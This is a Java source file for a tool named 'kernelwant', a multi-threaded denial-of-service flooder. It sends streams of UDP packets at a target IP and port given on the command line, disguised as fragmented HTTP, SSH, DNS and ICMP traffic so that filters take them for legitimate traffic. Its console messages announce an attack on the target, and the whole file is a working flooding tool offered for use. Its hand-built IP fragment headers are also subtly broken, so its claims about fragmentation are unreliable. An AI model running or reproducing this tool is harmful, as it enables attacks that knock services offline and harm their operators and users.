import java.io.IOException;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.DatagramChannel;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.LockSupport;

public class kernelwant {
    private static final int MAX_FRAGMENT_SIZE = 512;
    private static final int MIN_FRAGMENT_SIZE = 64;
    private static final int LEGITIMATE_PACKET_SIZE = 1024;
    private static final int FRAGMENT_OVERHEAD = 20;
    
    private final String targetIP;
    private final int targetPort;
    private final int duration;
    private final int threadCount;
    private final ExecutorService executor;
    private final ScheduledExecutorService scheduler;
    private final Random random = new Random();
    private final AtomicInteger packetCounter = new AtomicInteger(0);
    
    // эмуляция легитимного трафика
    private final byte[][] legitimatePatterns = {
        generateHTTPPattern(),
        generateSSHPattern(),
        generateDNSPattern(),
        generateICMPPattern()
    };
    
    public kernelwant(String targetIP, int targetPort, int duration, int threadCount) {
        this.targetIP = targetIP;
        this.targetPort = targetPort;
        this.duration = duration;
        this.threadCount = threadCount;
        this.executor = Executors.newFixedThreadPool(threadCount);
        this.scheduler = Executors.newSingleThreadScheduledExecutor();
    }
    
    public void start() throws IOException, InterruptedException {
        System.out.println("kernelwant: запуск фрагментированной атаки на " + targetIP + ":" + targetPort);
        
        // запуск фрагментированных потоков
        for (int i = 0; i < threadCount; i++) {
            executor.submit(new FragmentWorker(i));
        }
        
        // таймер завершения
        scheduler.schedule(() -> {
            System.out.println("kernelwant: завершение атаки");
            executor.shutdownNow();
            System.exit(0);
        }, duration, TimeUnit.SECONDS);
        
        executor.awaitTermination(duration + 1, TimeUnit.SECONDS);
    }
    
    private class FragmentWorker implements Runnable {
        private final int workerId;
        private final DatagramChannel channel;
        private final InetAddress targetAddress;
        
        public FragmentWorker(int workerId) throws IOException {
            this.workerId = workerId;
            this.channel = DatagramChannel.open();
            this.channel.configureBlocking(false);
            this.targetAddress = InetAddress.getByName(targetIP);
        }
        
        @Override
        public void run() {
            try {
                while (!Thread.currentThread().isInterrupted()) {
                    // выбираем случайный легитимный паттерн
                    byte[] basePattern = legitimatePatterns[random.nextInt(legitimatePatterns.length)];
                    
                    // создаем фрагментированные пакеты
                    List<byte[]> fragments = createFragments(basePattern);
                    
                    // отправляем фрагменты с задержками
                    sendFragments(fragments);
                    
                    // микро-задержка для имитации реального трафика
                    LockSupport.parkNanos(TimeUnit.MICROSECONDS.toNanos(random.nextInt(100) + 50));
                }
            } catch (Exception e) {
                System.err.println("Worker " + workerId + " error: " + e.getMessage());
            }
        }
        
        private List<byte[]> createFragments(byte[] baseData) {
            List<byte[]> fragments = new ArrayList<>();
            int offset = 0;
            int fragmentId = random.nextInt(65536);
            boolean moreFragments = true;
            
            while (offset < baseData.length && moreFragments) {
                int fragmentSize = Math.min(
                    random.nextInt(MAX_FRAGMENT_SIZE - MIN_FRAGMENT_SIZE) + MIN_FRAGMENT_SIZE,
                    baseData.length - offset
                );
                
                if (offset + fragmentSize >= baseData.length) {
                    moreFragments = false;
                }
                
                byte[] fragment = createFragment(
                    baseData, offset, fragmentSize, fragmentId, moreFragments
                );
                
                fragments.add(fragment);
                offset += fragmentSize;
            }
            
            return fragments;
        }
        
        private byte[] createFragment(byte[] data, int offset, int size, int fragmentId, boolean moreFragments) {
            ByteBuffer buffer = ByteBuffer.allocate(size + FRAGMENT_OVERHEAD);
            
            // IP заголовок с фрагментацией
            buffer.put((byte) 0x45); // версия + IHL
            buffer.put((byte) 0x00); // TOS
            buffer.putShort((short) (size + FRAGMENT_OVERHEAD)); // общая длина
            buffer.putShort((short) fragmentId); // идентификатор
            buffer.putShort((short) (offset / 8)); // флаги + смещение
            if (moreFragments) {
                buffer.putShort((short) (buffer.getShort(6) | 0x2000)); // установка флага MF
            }
            buffer.put((byte) 0x40); // TTL
            buffer.put((byte) 0x11); // протокол UDP
            buffer.putShort((short) 0); // контрольная сумма (будет вычислена)
            buffer.put(targetAddress.getAddress()); // IP назначения
            buffer.put(InetAddress.getLocalHost().getAddress()); // IP источника
            
            // UDP заголовок
            buffer.putShort((short) (random.nextInt(65535) + 1024)); // порт источника
            buffer.putShort((short) targetPort); // порт назначения
            buffer.putShort((short) (size + 8)); // длина UDP
            buffer.putShort((short) 0); // контрольная сумма UDP
            
            // данные
            buffer.put(data, offset, size);
            
            return buffer.array();
        }
        
        private void sendFragments(List<byte[]> fragments) {
            try {
                for (int i = 0; i < fragments.size(); i++) {
                    byte[] fragment = fragments.get(i);
                    SocketAddress target = new InetSocketAddress(targetAddress, targetPort);
                    
                    // случайная задержка между фрагментами
                    if (i > 0) {
                        LockSupport.parkNanos(TimeUnit.MICROSECONDS.toNanos(random.nextInt(50) + 10));
                    }
                    
                    channel.send(ByteBuffer.wrap(fragment), target);
                    packetCounter.incrementAndGet();
                }
            } catch (IOException e) {
                System.err.println("Send error: " + e.getMessage());
            }
        }
    }
    
    // генерация легитимных паттернов трафика
    private static byte[] generateHTTPPattern() {
        String httpRequest = "GET / HTTP/1.1\r\n" +
                           "Host: " + generateRandomHost() + "\r\n" +
                           "User-Agent: " + generateRandomUserAgent() + "\r\n" +
                           "Accept: text/html,application/xhtml+xml\r\n" +
                           "Connection: keep-alive\r\n\r\n";
        return httpRequest.getBytes();
    }
    
    private static byte[] generateSSHPattern() {
        // SSH handshake simulation
        byte[] sshPattern = new byte[256];
        sshPattern[0] = (byte) 0x53; // SSH version
        sshPattern[1] = (byte) 0x53;
        sshPattern[2] = (byte) 0x48;
        return sshPattern;
    }
    
    private static byte[] generateDNSPattern() {
        // DNS query simulation
        byte[] dnsPattern = new byte[64];
        dnsPattern[0] = (byte) 0x12; // transaction ID
        dnsPattern[1] = (byte) 0x34;
        dnsPattern[2] = (byte) 0x01; // flags
        dnsPattern[3] = (byte) 0x00;
        dnsPattern[4] = (byte) 0x00; // questions
        dnsPattern[5] = (byte) 0x01;
        return dnsPattern;
    }
    
    private static byte[] generateICMPPattern() {
        // ICMP ping simulation
        byte[] icmpPattern = new byte[32];
        icmpPattern[0] = (byte) 0x08; // ICMP type (echo request)
        icmpPattern[1] = (byte) 0x00; // code
        return icmpPattern;
    }
    
    private static String generateRandomHost() {
        String[] hosts = {"google.com", "facebook.com", "youtube.com", "amazon.com", "github.com"};
        return hosts[new Random().nextInt(hosts.length)];
    }
    
    private static String generateRandomUserAgent() {
        String[] userAgents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        };
        return userAgents[new Random().nextInt(userAgents.length)];
    }
    
    public static void main(String[] args) throws IOException, InterruptedException {
        if (args.length != 4) {
            System.err.println("Usage: java -jar kernelwant.jar <targetIP> <targetPort> <duration> <threadCount>");
            System.exit(1);
        }
        
        String targetIP = args[0];
        int targetPort = Integer.parseInt(args[1]);
        int duration = Integer.parseInt(args[2]);
        int threadCount = Integer.parseInt(args[3]);
        
        kernelwant attack = new kernelwant(targetIP, targetPort, duration, threadCount);
        attack.start();
    }
}
